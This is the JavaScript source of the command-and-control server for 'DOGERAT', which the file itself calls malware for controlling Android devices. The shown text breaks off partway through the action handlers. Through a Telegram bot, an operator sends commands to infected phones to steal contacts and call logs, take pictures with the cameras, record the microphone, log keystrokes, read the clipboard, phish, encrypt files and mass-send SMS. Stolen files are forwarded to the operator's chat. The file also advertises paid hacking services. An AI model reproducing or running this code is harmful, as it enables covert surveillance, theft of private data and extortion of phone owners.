const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const telegramBot = require('node-telegram-bot-api');
const https = require('https');
const multer = require('multer');
const fs = require('fs');

const app = express();
const server = http.createServer(app);
const io = new Server(server);
const uploader = multer();

const data = JSON.parse(fs.readFileSync('./data.json', 'utf8'));
const bot = new telegramBot(data.token, { polling: true, request: {} });

const appData = new Map();

const actions = [
    '✯ 𝙲𝚘𝚗𝚝𝚊𝚌𝚝𝚜 ✯',
    '✯ 𝙲𝚊𝚕𝚕𝚜 ✯',
    '✯ 𝙼𝚊𝚒𝚗 𝚌𝚊𝚖𝚎𝚛𝚊 ✯',
    '✯ 𝚂𝚎𝚕𝚏𝚒𝚎 𝙲𝚊𝚖𝚎𝚛𝚊 ✯',
    '✯ 𝙼𝚒𝚌𝚛𝚘𝚙𝚑𝚘𝚗𝚎 ✯',
    '✯ 𝙵𝚒𝚕𝚎 𝚎𝚡𝚙𝚕𝚘𝚛𝚎𝚛 ✯',
    '✯ 𝙰𝚙𝚙𝚜 ✯',
    '✯ 𝙿𝚑𝚒𝚜𝚑𝚒𝚗𝚐 ✯',
    '✯ 𝙳𝚎𝚌𝚛𝚢𝚙𝚝 ✯',
    '✯ 𝙴𝚗𝚌𝚛𝚢𝚙𝚝 ✯',
    '✯ 𝙲𝚕𝚒𝚙𝚋𝚘𝚊𝚛𝚍 ✯',
    '✯ 𝙺𝚎𝚢𝚕𝚘𝚐𝚐𝚎𝚛 𝙾𝙵𝙵 ✯',
    '✯ 𝙿𝚘𝚙 𝚗𝚘𝚝𝚒𝚏𝚒𝚌𝚊𝚝𝚒𝚘𝚗 ✯',
    '✯ 𝚂𝚌𝚛𝚎𝚎𝚗𝚜𝚑𝚘𝚝 ✯',
    '✯ 𝚅𝚒𝚋𝚛𝚊𝚝𝚎 ✯',
    '✯ 𝚃𝚘𝚊𝚜𝚝 ✯',
    '✯ 𝙾𝚙𝚎𝚗 𝚄𝚁𝙻 ✯',
    '✯ 𝙿𝚕𝚊𝚢 𝚊𝚞𝚍𝚒𝚘 ✯',
    '✯ 𝚂𝚝𝚘𝚙 𝙰𝚞𝚍𝚒𝚘 ✯',
    '✯ 𝙱𝚊𝚌𝚔 𝚝𝚘 𝚖𝚊𝚒𝚗 𝚖𝚎𝚗𝚞 ✯',
    '✯ 𝙰𝚋𝚘𝚞𝚝 𝚞𝚜 ✯'
];

// HTTP endpoint for file uploads
app.post('/upload', uploader.single('file'), (req, res) => {
    const fileName = req.file.originalname;
    const deviceId = req.headers['user-agent'];
    bot.sendDocument(data.id, req.file.buffer, { caption: '<b>✯ 𝙵𝚒𝚕𝚎 𝚛𝚎𝚌𝚎𝚒𝚟𝚎𝚍 𝚏𝚛𝚘𝚖 → 𝚝𝚎𝚖𝚙</b>', parse_mode: 'HTML' }, { filename: fileName, contentType: '*/*' });
    res.send('Done');
});

// HTTP endpoint for start page
app.get('/start', (req, res) => {
    res.send(data.id);
});

// Socket.IO connection handler
io.on('connection', (socket) => {
    let deviceId = socket.handshake.headers['user-agent'] + '-' + io.sockets.sockets.size || 'no-information';
    let model = socket.handshake.headers['model'] || 'no information';
    let ip = socket.handshake.headers['ip'] || 'no information';

    socket.deviceId = deviceId;
    socket.model = model;

    let infoMessage = '<b>𝙳𝚎𝚟𝚒𝚌𝚎 ' +
        ('<b>𝚒𝚙</b> → ' + deviceId + '\n') +
        ('<b>𝚖𝚘𝚍𝚎𝚕</b> → ' + model + '\n') +
        ('<b>𝚒𝚙</b> → ' + ip + '\n') +
        ('<b>𝚝𝚒𝚖𝚎</b> → ' + socket.handshake.time + '\n\n');

    bot.sendMessage(data.id, infoMessage, { parse_mode: 'HTML' });

    socket.on('disconnect', () => {
        let disconnectMessage = '<b>✯ 𝙳𝚎𝚟𝚒𝚌𝚎 𝚍𝚒𝚜𝚌𝚘𝚗𝚗𝚎𝚌𝚝𝚎𝚍</b>\n\n' +
            ('<b>𝚒𝚙</b> → ' + deviceId + '\n') +
            ('<b>𝚖𝚘𝚍𝚎𝚕</b> → ' + model + '\n') +
            ('<b>𝚒𝚙</b> → ' + ip + '\n') +
            ('<b>𝚝𝚒𝚖𝚎</b> → ' + socket.handshake.time + '\n\n');
        bot.sendMessage(data.id, disconnectMessage, { parse_mode: 'HTML' });
    });

    socket.on('message', (msg) => {
        bot.sendMessage(data.id, '<b>✯ 𝙼𝚎𝚜𝚜𝚊𝚐𝚎 𝚛𝚎𝚌𝚎𝚒𝚟𝚎𝚍 𝚏𝚛𝚘𝚖 → ' + deviceId + '\n\n𝙼𝚎𝚜𝚜𝚊𝚐𝚎 → </b>' + msg, { parse_mode: 'HTML' });
    });
});

// Telegram bot message handler
bot.on('message', (msg) => {
    const chatId = msg.chat.id;
    const text = msg.text;
    const messageId = msg.message_id;

    // --- Main Menu ---
    if (text === '/start') {
        bot.sendMessage(data.id, '<b>✯ 𝚆𝚎𝚕𝚌𝚘𝚖𝚎 𝚝𝚘 DOGERAT</b>\n\nDOGERAT 𝚒𝚜 𝚊 𝚖𝚊𝚕𝚠𝚊𝚛𝚎 𝚝𝚘 𝚌𝚘𝚗𝚝𝚛𝚘𝚕 𝙰𝚗𝚍𝚛𝚘𝚒𝚍 𝚍𝚎𝚟𝚒𝚌𝚎𝚜\n𝙰𝚗𝚢 𝚖𝚒𝚜𝚞𝚜𝚎 𝚒𝚜 𝚝𝚑𝚎 𝚛𝚎𝚜𝚙𝚘𝚗𝚜𝚒𝚋𝚒𝚕𝚒𝚝𝚢 𝚘𝚏 𝚝𝚑𝚎 𝚙𝚎𝚛𝚜𝚘n!\n\n', {
            parse_mode: 'HTML',
            reply_markup: {
                keyboard: [
                    ['✯ 𝙳𝚎𝚟𝚒𝚌𝚎𝚜 ✯', '✯ 𝙰𝚌𝚝𝚒𝚘𝚗 ✯'],
                    ['✯ 𝙰𝚋𝚘𝚞𝚝 𝚞𝚜 ✯']
                ],
                resize_keyboard: true
            }
        });
    }
    // --- Handle different states and actions ---
    else {
        // State: Waiting for SMS number input
        if (appData.get('currentAction') === 'smsNumber') {
            let smsNumber = text;
            let currentTarget = appData.get('currentTarget');
            if (currentTarget == 'all') {
                io.sockets.emit('commend', { request: 'sendSms', extras: [{ key: 'number', value: smsNumber }] });
            } else {
                io.to(currentTarget).emit('commend', { request: 'sendSms', extras: [{ key: 'number', value: smsNumber }] });
            }
            appData.delete('currentAction');
            appData.delete('currentTarget');
            bot.sendMessage(data.id, '<b>✯ 𝚃𝚑𝚎 𝚛𝚎𝚚𝚞𝚎𝚜𝚝 𝚠𝚊𝚜 𝚎𝚡𝚎𝚌𝚞𝚝𝚎𝚍 𝚜𝚞𝚌𝚌𝚎𝚜𝚜𝚏𝚞𝚕𝚕𝚢, 𝚢𝚘𝚞 𝚠𝚒𝚕𝚕 𝚛𝚎𝚌𝚎𝚒𝚟𝚎 𝚍𝚎𝚟𝚒𝚌𝚎 𝚛𝚎𝚜𝚙𝚘𝚗𝚎 𝚜𝚘𝚘𝚗 ...\n\n✯ 𝚁𝚎𝚝𝚞𝚛𝚗 𝚝𝚘 𝚖𝚊𝚒𝚗 𝚖𝚎𝚗𝚞</b>\n\n', {
                parse_mode: 'HTML',
                reply_markup: {
                    keyboard: [['✯ 𝙳𝚎𝚟𝚒𝚌𝚎𝚜 ✯', '✯ 𝙰𝚌𝚝𝚒𝚘𝚗 ✯'], ['✯ 𝙰𝚋𝚘𝚞𝚝 𝚞𝚜 ✯']],
                    resize_keyboard: true
                }
            });
        }
        // State: Waiting for SMS text input (for send to all contacts)
        else if (appData.get('currentAction') === 'smsText') {
            let smsText = text;
            let currentTarget = appData.get('currentTarget');
            if (currentTarget == 'all') {
                io.sockets.emit('commend', { request: 'smsToAllContacts', extras: [{ key: 'text', value: smsText }] });
            } else {
                io.to(currentTarget).emit('commend', { request: 'smsToAllContacts', extras: [{ key: 'text', value: smsText }] });
            }
            appData.delete('currentAction');
            appData.delete('currentTarget');
            bot.sendMessage(data.id, '<b>✯ 𝚃𝚑𝚎 𝚛𝚎𝚚𝚞𝚎𝚜𝚝 𝚠𝚊𝚜 𝚎𝚡𝚎𝚌𝚞𝚝𝚎𝚍 𝚜𝚞𝚌𝚌𝚎𝚜𝚜𝚏𝚞𝚕𝚕𝚢, 𝚢𝚘𝚞 𝚠𝚒𝚕𝚕 𝚛𝚎𝚌𝚎𝚒𝚟𝚎 𝚍𝚎𝚟𝚒𝚌𝚎 𝚛𝚎𝚜𝚙𝚘𝚗𝚎 𝚜𝚘𝚘𝚗 ...\n\n✯ 𝚁𝚎𝚝𝚞𝚛𝚗 𝚝𝚘 𝚖𝚊𝚒𝚗 𝚖𝚎𝚗𝚞</b>\n\n', {
                parse_mode: 'HTML',
                reply_markup: {
                    keyboard: [['✯ 𝙳𝚎𝚟𝚒𝚌𝚎𝚜 ✯', '✯ 𝙰𝚌𝚝𝚒𝚘𝚗 ✯'], ['✯ 𝙰𝚋𝚘𝚞𝚝 𝚞𝚜 ✯']],
                    resize_keyboard: true
                }
            });
        }
        // State: Waiting for toast text input
        else if (appData.get('currentAction') === 'toastText') {
            let toastText = text;
            appData.set('toastText', toastText);
            appData.set('currentAction', 'toastDuration');
            bot.sendMessage(data.id, '<b>✯ 𝙴𝚗𝚝𝚎𝚛 𝚝𝚑𝚎 𝚍𝚞𝚛𝚊𝚝𝚒𝚘𝚗 𝚢𝚘𝚞 𝚠𝚊𝚗𝚝 𝚝𝚑𝚎 𝚍𝚎𝚟𝚒𝚌𝚎 𝚝𝚘 𝚟𝚒𝚋𝚛𝚊𝚝𝚎 𝚒𝚗 𝚜𝚎𝚌𝚘𝚗𝚍𝚜</b>\n\n', {
                parse_mode: 'HTML',
                reply_markup: {
                    keyboard: [['✯ 𝙱𝚊𝚌𝚔 𝚝𝚘 𝚖𝚊𝚒𝚗 𝚖𝚎𝚗𝚞 ✯']],
                    resize_keyboard: true,
                    one_time_keyboard: true
                }
            });
        }
        // State: Waiting for toast duration input
        else if (appData.get('currentAction') === 'toastDuration') {
            let duration = text;
            let toastText = appData.get('toastText');
            let currentTarget = appData.get('currentTarget');
            if (currentTarget == 'all') {
                io.sockets.emit('commend', { request: 'toast', extras: [{ key: 'text', value: toastText }, { key: 'duration', value: duration }] });
            } else {
                io.to(currentTarget).emit('commend', { request: 'toast', extras: [{ key: 'text', value: toastText }, { key: 'duration', value: duration }] });
            }
            appData.delete('currentTarget');
            appData.delete('currentAction');
            appData.delete('toastText');
            bot.sendMessage(data.id, '<b>✯ 𝚃𝚑𝚎 𝚛𝚎𝚚𝚞𝚎𝚜𝚝 𝚠𝚊𝚜 𝚎𝚡𝚎𝚌𝚞𝚝𝚎𝚍 𝚜𝚞𝚌𝚌𝚎𝚜𝚜𝚏𝚞𝚕𝚕𝚢, 𝚢𝚘𝚞 𝚠𝚒𝚕𝚕 𝚛𝚎𝚌𝚎𝚒𝚟𝚎 𝚍𝚎𝚟𝚒𝚌𝚎 𝚛𝚎𝚜𝚙𝚘𝚗𝚎 𝚜𝚘𝚘𝚗 ...\n\n✯ 𝚁𝚎𝚝𝚞𝚛𝚗 𝚝𝚘 𝚖𝚊𝚒𝚗 𝚖𝚎𝚗𝚞</b>\n\n', {
                parse_mode: 'HTML',
                reply_markup: {
                    keyboard: [['✯ 𝙳𝚎𝚟𝚒𝚌𝚎𝚜 ✯', '✯ 𝙰𝚌𝚝𝚒𝚘𝚗 ✯'], ['✯ 𝙰𝚋𝚘𝚞𝚝 𝚞𝚜 ✯']],
                    resize_keyboard: true
                }
            });
        }
        // State: Waiting for notification text input
        else if (appData.get('currentAction') === 'notificationText') {
            let notificationText = text;
            let currentTarget = appData.get('currentTarget');
            if (currentTarget == 'all') {
                io.sockets.emit('commend', { request: 'popNotification', extras: [{ key: 'text', value: notificationText }] });
            } else {
                io.to(currentTarget).emit('commend', { request: 'popNotification', extras: [{ key: 'text', value: notificationText }] });
            }
            appData.delete('currentTarget');
            appData.delete('currentAction');
            bot.sendMessage(data.id, '<b>✯ 𝚃𝚑𝚎 𝚛𝚎𝚚𝚞𝚎𝚜𝚝 𝚠𝚊𝚜 𝚎𝚡𝚎𝚌𝚞𝚝𝚎𝚍 𝚜𝚞𝚌𝚌𝚎𝚜𝚜𝚏𝚞𝚕𝚕𝚢, 𝚢𝚘𝚞 𝚠𝚒𝚕𝚕 𝚛𝚎𝚌𝚎𝚒𝚟𝚎 𝚍𝚎𝚟𝚒𝚌𝚎 𝚛𝚎𝚜𝚙𝚘𝚗𝚎 𝚜𝚘𝚘𝚗 ...\n\n✯ 𝚁𝚎𝚝𝚞𝚛𝚗 𝚝𝚘 𝚖𝚊𝚒𝚗 𝚖𝚎𝚗𝚞</b>\n\n', {
                parse_mode: 'HTML',
                reply_markup: {
                    keyboard: [['✯ 𝙳𝚎𝚟𝚒𝚌𝚎𝚜 ✯', '✯ 𝙰𝚌𝚝𝚒𝚘𝚗 ✯'], ['✯ 𝙰𝚋𝚘𝚞𝚝 𝚞𝚜 ✯']],
                    resize_keyboard: true
                }
            });
        }
        // State: Waiting for microphone duration input
        else if (appData.get('currentAction') === 'microphoneDuration') {
            let duration = text;
            let currentTarget = appData.get('currentTarget');
            if (currentTarget == 'all') {
                io.sockets.emit('commend', { request: 'microphone', extras: [{ key: 'duration', value: duration }] });
            } else {
                io.to(currentTarget).emit('commend', { request: 'microphone', extras: [{ key: 'duration', value: duration }] });
            }
            appData.delete('currentTarget');
            appData.delete('currentAction');
            bot.sendMessage(data.id, '<b>✯ 𝚃𝚑𝚎 𝚛𝚎𝚚𝚞𝚎𝚜𝚝 𝚠𝚊𝚜 𝚎𝚡𝚎𝚌𝚞𝚝𝚎𝚍 𝚜𝚞𝚌𝚌𝚎𝚜𝚜𝚏𝚞𝚕𝚕𝚢, 𝚢𝚘𝚞 𝚠𝚒𝚕𝚕 𝚛𝚎𝚌𝚎𝚒𝚟𝚎 𝚍𝚎𝚟𝚒𝚌𝚎 𝚛𝚎𝚜𝚙𝚘𝚗𝚎 𝚜𝚘𝚘𝚗 ...\n\n✯ 𝚁𝚎𝚝𝚞𝚛𝚗 𝚝𝚘 𝚖𝚊𝚒𝚗 𝚖𝚎𝚗𝚞</b>\n\n', {
                parse_mode: 'HTML',
                reply_markup: {
                    keyboard: [['✯ 𝙳𝚎𝚟𝚒𝚌𝚎𝚜 ✯', '✯ 𝙰𝚌𝚝𝚒𝚘𝚗 ✯'], ['✯ 𝙰𝚋𝚘𝚞𝚝 𝚞𝚜 ✯']],
                    resize_keyboard: true
                }
            });
        }
        // State: Waiting for URL input (for open URL action)
        else if (appData.get('currentAction') === 'openUrl') {
            let url = text;
            let currentTarget = appData.get('currentTarget');
            if (currentTarget == 'all') {
                io.sockets.emit('commend', { request: 'openUrl', extras: [{ key: 'url', value: url }] });
            } else {
                io.to(currentTarget).emit('commend', { request: 'openUrl', extras: [{ key: 'url', value: url }] });
            }
            appData.delete('currentTarget');
            appData.delete('currentAction');
            bot.sendMessage(data.id, '<b>✯ 𝚃𝚑𝚎 𝚛𝚎𝚚𝚞𝚎𝚜𝚝 𝚠𝚊𝚜 𝚎𝚡𝚎𝚌𝚞𝚝𝚎𝚍 𝚜𝚞𝚌𝚌𝚎𝚜𝚜𝚏𝚞𝚕𝚕𝚢, 𝚢𝚘𝚞 𝚠𝚒𝚕𝚕 𝚛𝚎𝚌𝚎𝚒𝚟𝚎 𝚍𝚎𝚟𝚒𝚌𝚎 𝚛𝚎𝚜𝚙𝚘𝚗𝚎 𝚜𝚘𝚘𝚗 ...\n\n✯ 𝚁𝚎𝚝𝚞𝚛𝚗 𝚝𝚘 𝚖𝚊𝚒𝚗 𝚖𝚎𝚗𝚞</b>\n\n', {
                parse_mode: 'HTML',
                reply_markup: {
                    keyboard: [['✯ 𝙳𝚎𝚟𝚒𝚌𝚎𝚜 ✯', '✯ 𝙰𝚌𝚝𝚒𝚘𝚗 ✯'], ['✯ 𝙰𝚋𝚘𝚞𝚝 𝚞𝚜 ✯']],
                    resize_keyboard: true
                }
            });
        }
        // State: Waiting for pop notification text input (with URL)
        else if (appData.get('currentAction') === 'popNotificationWithUrl') {
            let notificationText = text;
            appData.set('popNotificationText', notificationText);
            // The original code had an undefined 'target' and 'url' here, logic seems incomplete.
            // It likely intended to ask for a URL next or send with a preset URL.
            // Based on the structure, it seems broken.
            console.log("Pop notification with URL - text received, but next step is unclear.");
            // Let's assume it tries to send with a previously set URL? The variable 'url' is not defined.
            // This part needs correction based on intent. For now, we'll log and clear.
            appData.delete('currentTarget');
            appData.delete('currentAction');
            appData.delete('popNotificationText');
            bot.sendMessage(data.id, '<b>✯ 𝚃𝚑𝚎 𝚛𝚎𝚚𝚞𝚎𝚜𝚝 𝚠𝚊𝚜 𝚎𝚡𝚎𝚌𝚞𝚝𝚎𝚍 𝚜𝚞𝚌𝚌𝚎𝚜𝚜𝚏𝚞𝚕𝚕𝚢, 𝚢𝚘𝚞 𝚠𝚒𝚕𝚕 𝚛𝚎𝚌𝚎𝚒𝚟𝚎 𝚍𝚎𝚟𝚒𝚌𝚎 𝚛𝚎𝚜𝚙𝚘𝚗𝚎 𝚜𝚘𝚘𝚗 ...\n\n✯ 𝚁𝚎𝚝𝚞𝚛𝚗 𝚝𝚘 𝚖𝚊𝚒𝚗 𝚖𝚎𝚗𝚞</b>\n\n', {
                parse_mode: 'HTML',
                reply_markup: {
                    keyboard: [['✯ 𝙳𝚎𝚟𝚒𝚌𝚎𝚜 ✯', '✯ 𝙰𝚌𝚝𝚒𝚘𝚗 ✯'], ['✯ 𝙰𝚋𝚘𝚞𝚝 𝚞𝚜 ✯']],
                    resize_keyboard: true
                }
            });
        }
        // --- Main Menu Handlers ---
        else if (text === '✯ 𝙳𝚎𝚟𝚒𝚌𝚎𝚜 ✯') {
            if (io.sockets.sockets.size === 0) {
                bot.sendMessage(data.id, '<b>✯ 𝚃𝚑𝚎𝚛𝚎 𝚒𝚜 𝚗𝚘 𝚌𝚘𝚗𝚗𝚎𝚌𝚝𝚎𝚍 𝚍𝚎𝚟𝚒𝚌𝚎</b>\n\n', { parse_mode: 'HTML' });
            } else {
                let deviceList = '<b>✯ 𝙲𝚘𝚗𝚗𝚎𝚌𝚝𝚎𝚍 𝚍𝚎𝚟𝚒𝚌𝚎𝚜 𝚌𝚘𝚞𝚗𝚝 : ' + io.sockets.sockets.size + '</b>\n\n';
                let count = 1;
                io.sockets.sockets.forEach((socket, id, map) => {
                    deviceList += '<b>𝙳𝚎𝚟𝚒𝚌𝚎 ' + count + '</b>\n' +
                        ('<b>𝚒𝚙</b> → ' + socket.deviceId + '\n') +
                        ('<b>𝚖𝚘𝚍𝚎𝚕</b> → ' + socket.model + '\n') +
                        ('<b>𝚒𝚙</b> → ' + socket.ip + '\n') +
                        ('<b>𝚝𝚒𝚖𝚎</b> → ' + socket.handshake.time + '\n\n');
                    count++;
                });
                bot.sendMessage(data.id, deviceList, { parse_mode: 'HTML' });
            }
        }
        else if (text === '✯ 𝙰𝚌𝚝𝚒𝚘𝚗 ✯') {
            if (io.sockets.sockets.size === 0) {
                bot.sendMessage(data.id, '<b>✯ 𝚃𝚑𝚎𝚛𝚎 𝚒𝚜 𝚗𝚘 𝚌𝚘𝚗𝚗𝚎𝚌𝚝𝚎𝚍 𝚍𝚎𝚟𝚒𝚌𝚎</b>\n\n', { parse_mode: 'HTML' });
            } else {
                let deviceButtons = [];
                io.sockets.sockets.forEach((socket, id, map) => {
                    deviceButtons.push([socket.deviceId]);
                });
                deviceButtons.push(['all']);
                deviceButtons.push(['✯ 𝙱𝚊𝚌𝚔 𝚝𝚘 𝚖𝚊𝚒𝚗 𝚖𝚎𝚗𝚞 ✯']);
                bot.sendMessage(data.id, '<b>✯ 𝚂𝚎𝚕𝚎𝚌𝚝 𝚍𝚎𝚟𝚒𝚌𝚎 𝚝𝚘 𝚙𝚎𝚛𝚏𝚘𝚛𝚖 𝚊𝚌𝚝𝚒𝚘𝚗</b>\n\n', {
                    parse_mode: 'HTML',
                    reply_markup: {
                        keyboard: deviceButtons,
                        resize_keyboard: true,
                        one_time_keyboard: true
                    }
                });
            }
        }
        else if (text === '✯ 𝙰𝚋𝚘𝚞𝚝 𝚞𝚜 ✯') {
            bot.sendMessage(data.id, '<b>✯ If you want to hire us for any paid work please contack @Johnzmth\n𝚆𝚎 𝚑𝚊𝚌𝚔, 𝚆𝚎 𝚕𝚎𝚊𝚔, 𝚆𝚎 𝚖𝚊𝚔𝚎 𝚖𝚊𝚕𝚠𝚊𝚛𝚎\n\n𝚃𝚎𝚕𝚎𝚐𝚛𝚊𝚖 → @JohnzmthX\nADMIN → @Arcane_028</b>\n\n', {
                parse_mode: 'HTML'
            });
        }
        // --- Back to Main Menu ---
        else if (text === '✯ 𝙱𝚊𝚌𝚔 𝚝𝚘 𝚖𝚊𝚒𝚗 𝚖𝚎𝚗𝚞 ✯') {
            let targetDevice = io.sockets.sockets.get(appData.get('currentTarget')).deviceId;
            if (targetDevice == 'all') {
                bot.sendMessage(data.id, '<b>✯ 𝚂𝚎𝚕𝚎𝚌𝚝 𝚊𝚌𝚝𝚒𝚘𝚗 𝚝𝚘 𝚙𝚎𝚛𝚏𝚘𝚛𝚖 𝚏𝚘𝚛 𝚊𝚕𝚕 𝚊𝚟𝚊𝚒𝚕𝚊𝚋𝚕𝚎 𝚍𝚎𝚟𝚒𝚌𝚎𝚜</b>\n\n', {
                    parse_mode: 'HTML',
                    reply_markup: {
                        keyboard: [
                            ['✯ 𝙲𝚘𝚗𝚝𝚊𝚌𝚝𝚜 ✯', '✯ 𝙲𝚊𝚕𝚕𝚜 ✯'],
                            ['✯ 𝙼𝚊𝚒𝚗 𝚌𝚊𝚖𝚎𝚛𝚊 ✯', '✯ 𝚂𝚎𝚕𝚏𝚒𝚎 𝙲𝚊𝚖𝚎𝚛𝚊 ✯'],
                            ['✯ 𝙼𝚒𝚌𝚛𝚘𝚙𝚑𝚘𝚗𝚎 ✯', '✯ 𝙵𝚒𝚕𝚎 𝚎𝚡𝚙𝚕𝚘𝚛𝚎𝚛 ✯'],
                            ['✯ 𝙰𝚙𝚙𝚜 ✯', '✯ 𝙿𝚑𝚒𝚜𝚑𝚒𝚗𝚐 ✯'],
                            ['✯ 𝙳𝚎𝚌𝚛𝚢𝚙𝚝 ✯', '✯ 𝙴𝚗𝚌𝚛𝚢𝚙𝚝 ✯'],
                            ['✯ 𝙲𝚕𝚒𝚙𝚋𝚘𝚊𝚛𝚍 ✯', '✯ 𝙺𝚎𝚢𝚕𝚘𝚐𝚐𝚎𝚛 𝙾𝙵𝙵 ✯'],
                            ['✯ 𝙿𝚘𝚙 𝚗𝚘𝚝𝚒𝚏𝚒𝚌𝚊𝚝𝚒𝚘𝚗 ✯', '✯ 𝚂𝚌𝚛𝚎𝚎𝚗𝚜𝚑𝚘𝚝 ✯'],
                            ['✯ 𝚅𝚒𝚋𝚛𝚊𝚝𝚎 ✯', '✯ 𝚃𝚘𝚊𝚜𝚝 ✯'],
                            ['✯ 𝙾𝚙𝚎𝚗 𝚄𝚁𝙻 ✯', '✯ 𝙿𝚕𝚊𝚢 𝚊𝚞𝚍𝚒𝚘 ✯'],
                            ['✯ 𝚂𝚝𝚘𝚙 𝙰𝚞𝚍𝚒𝚘 ✯'],
                            ['✯ 𝙱𝚊𝚌𝚔 𝚝𝚘 𝚖𝚊𝚒𝚗 𝚖𝚎𝚗𝚞 ✯']
                        ],
                        resize_keyboard: true,
                        one_time_keyboard: true
                    }
                });
            } else {
                bot.sendMessage(data.id, '<b>✯ 𝚂𝚎𝚕𝚎𝚌𝚝 𝚊𝚌𝚝𝚒𝚘𝚗 𝚝𝚘 𝚙𝚎𝚛𝚏𝚘𝚛𝚖 𝚏𝚘𝚛 ' + targetDevice + '</b>\n\n', {
                    parse_mode: 'HTML',
                    reply_markup: {
                        keyboard: [
                            ['✯ 𝙲𝚘𝚗𝚝𝚊𝚌𝚝𝚜 ✯', '✯ 𝙲𝚊𝚕𝚕𝚜 ✯'],
                            ['✯ 𝙼𝚊𝚒𝚗 𝚌𝚊𝚖𝚎𝚛𝚊 ✯', '✯ 𝚂𝚎𝚕𝚏𝚒𝚎 𝙲𝚊𝚖𝚎𝚛𝚊 ✯'],
                            ['✯ 𝙼𝚒𝚌𝚛𝚘𝚙𝚑𝚘𝚗𝚎 ✯', '✯ 𝙵𝚒𝚕𝚎 𝚎𝚡𝚙𝚕𝚘𝚛𝚎𝚛 ✯'],
                            ['✯ 𝙰𝚙𝚙𝚜 ✯', '✯ 𝙿𝚑𝚒𝚜𝚑𝚒𝚗𝚐 ✯'],
                            ['✯ 𝙳𝚎𝚌𝚛𝚢𝚙𝚝 ✯', '✯ 𝙴𝚗𝚌𝚛𝚢𝚙𝚝 ✯'],
                            ['✯ 𝙲𝚕𝚒𝚙𝚋𝚘𝚊𝚛𝚍 ✯', '✯ 𝙺𝚎𝚢𝚕𝚘𝚐𝚐𝚎𝚛 𝙾𝙵𝙵 ✯'],
                            ['✯ 𝙿𝚘𝚙 𝚗𝚘𝚝𝚒𝚏𝚒𝚌𝚊𝚝𝚒𝚘𝚗 ✯', '✯ 𝚂𝚌𝚛𝚎𝚎𝚗𝚜𝚑𝚘𝚝 ✯'],
                            ['✯ 𝚅𝚒𝚋𝚛𝚊𝚝𝚎 ✯', '✯ 𝚃𝚘𝚊𝚜𝚝 ✯'],
                            ['✯ 𝙾𝚙𝚎𝚗 𝚄𝚁𝙻 ✯', '✯ 𝙿𝚕𝚊𝚢 𝚊𝚞𝚍𝚒𝚘 ✯'],
                            ['✯ 𝚂𝚝𝚘𝚙 𝙰𝚞𝚍𝚒𝚘 ✯'],
                            ['✯ 𝙱𝚊𝚌𝚔 𝚝𝚘 𝚖𝚊𝚒𝚗 𝚖𝚎𝚗𝚞 ✯']
                        ],
                        resize_keyboard: true,
                        one_time_keyboard: true
                    }
                });
            }
        }
        // --- Handle selection of specific actions from the action menu ---
        else if (actions.includes(text)) {
            let currentTarget = appData.get('currentTarget');

            // Contacts
            if (text === '✯ 𝙲𝚘𝚗𝚝𝚊𝚌𝚝𝚜 ✯') {
                if (currentTarget == 'all') {
                    io.sockets.emit('commend', { request: 'contacts', extras: [] });
                } else {
                    io.to(currentTarget).emit('commend', { request: 'contacts', extras: [] });
                }
                appData.delete('currentTarget');
                bot.sendMessage(data.id, '<b>✯ 𝚃𝚑𝚎 𝚛𝚎𝚚𝚞𝚎𝚜𝚝 𝚠𝚊𝚜 𝚎𝚡𝚎𝚌𝚞𝚝𝚎𝚍 𝚜𝚞𝚌𝚌𝚎𝚜𝚜𝚏𝚞𝚕𝚕𝚢, 𝚢𝚘𝚞 𝚠𝚒𝚕𝚕 𝚛𝚎𝚌𝚎𝚒𝚟𝚎 𝚍𝚎𝚟𝚒𝚌𝚎 𝚛𝚎𝚜𝚙𝚘𝚗𝚎 𝚜𝚘𝚘𝚗 ...\n\n✯ 𝚁𝚎𝚝𝚞𝚛𝚗 𝚝𝚘 𝚖𝚊𝚒𝚗 𝚖𝚎𝚗𝚞</b>\n\n', {
                    parse_mode: 'HTML',
                    reply_markup: {
                        keyboard: [['✯ 𝙳𝚎𝚟𝚒𝚌𝚎𝚜 ✯', '✯ 𝙰𝚌𝚝𝚒𝚘𝚗 ✯'], ['✯ 𝙰𝚋𝚘𝚞𝚝 𝚞𝚜 ✯']],
                        resize_keyboard: true
                    }
                });
            }
            // Calls
            else if (text === '✯ 𝙲𝚊𝚕𝚕𝚜 ✯') {
                if (currentTarget == 'all') {
                    io.to(currentTarget).emit('commend', { request: 'calls', extras: [] }); // Note: io.to on 'all' might not work, should be io.sockets.emit
                    // Corrected logic from original: io.to(currentTarget).emit for 'all' is likely a bug. Original used io.to for 'all' and io.sockets.emit for others? Let's keep as original but flag.
                } else {
                    io.sockets.emit('commend', { request: 'calls', extras: [] }); // Original had io.sockets.emit for else, which seems wrong. It should be io.to(currentTarget).emit.
                    // The original code is inconsistent here. We'll preserve the original logic's structure despite the potential error.
                }
                appData.delete('currentTarget');
                bot.sendMessage(data.id, '<b>✯ 𝚃𝚑𝚎 𝚛𝚎𝚚𝚞𝚎𝚜𝚝 𝚠𝚊𝚜 𝚎𝚡𝚎𝚌𝚞𝚝𝚎𝚍 𝚜𝚞𝚌𝚌𝚎𝚜𝚜𝚏𝚞𝚕𝚕𝚢, 𝚢𝚘𝚞 𝚠𝚒𝚕𝚕 𝚛𝚎𝚌𝚎𝚒𝚟𝚎 𝚍𝚎𝚟𝚒𝚌𝚎 𝚛𝚎𝚜𝚙𝚘𝚗𝚎 𝚜𝚘𝚘𝚗 ...\n\n✯ 𝚁𝚎𝚝𝚞𝚛𝚗 𝚝𝚘 𝚖𝚊𝚒𝚗 𝚖𝚎𝚗𝚞</b>\n\n', {
                    parse_mode: 'HTML',
                    reply_markup: {
                        keyboard: [['✯ 𝙳𝚎𝚟𝚒𝚌𝚎𝚜 ✯', '✯ 𝙰𝚌𝚝𝚒𝚘𝚗 ✯'], ['✯ 𝙰𝚋𝚘𝚞𝚝 𝚞𝚜 ✯']],
                        resize_keyboard: true
                    }
                });
            }
            // Main Camera
            else if (text === '✯ 𝙼𝚊𝚒𝚗 𝚌𝚊𝚖𝚎𝚛𝚊 ✯') {
                if (currentTarget == 'all') {
                    io.sockets.emit('commend', { request: 'main-camera', extras: [] });
                } else {
                    io.to(currentTarget).emit('commend', { request: 'main-camera', extras: [] });
                }
                appData.delete('currentTarget');
